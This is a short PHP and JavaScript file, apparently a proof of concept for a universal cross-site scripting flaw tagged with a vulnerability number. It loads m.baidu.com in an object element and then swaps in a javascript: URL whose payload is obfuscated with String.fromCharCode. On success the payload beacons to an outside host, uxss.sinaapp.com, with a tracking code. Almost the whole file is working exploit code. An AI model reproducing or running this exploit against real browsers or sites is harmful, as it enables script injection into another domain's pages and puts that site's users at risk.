<?php
//漏洞编号：98053
?>
<?php
$code = htmlspecialchars(strip_tags($_GET['code']),ENT_QUOTES);
//$str = "if(document.domain == 'm.baidu.com'){new Image().src='http://uxss.sinaapp.com/set.php?code=".$code."&suc=4';}";
//$str = "if(document.domain == 'm.baidu.com'){alert(1)}";
$str = "var flag=0;suc();function suc(){if(flag){return;}if(document.domain == 'm.baidu.com'){flag=1;new Image().src='http://uxss.sinaapp.com/set.php?code=".$code."&suc=4';}}";

$tmp = str_split($str);
$result = array();

foreach($tmp as $key => $value){
    $result[$key] = ord($value);
}

$input = implode(",", $result);

?>

<script>
window.onload = function()
{
    object = document.createElement("object");
    object.data = "http://m.baidu.com";
    document.body.appendChild(object);
    object.onload = function() {
        object.data = "javascript:eval(String.fromCharCode(<?php echo $input; ?>))";
        object.innerHTML = "foo";
    }
}
</script>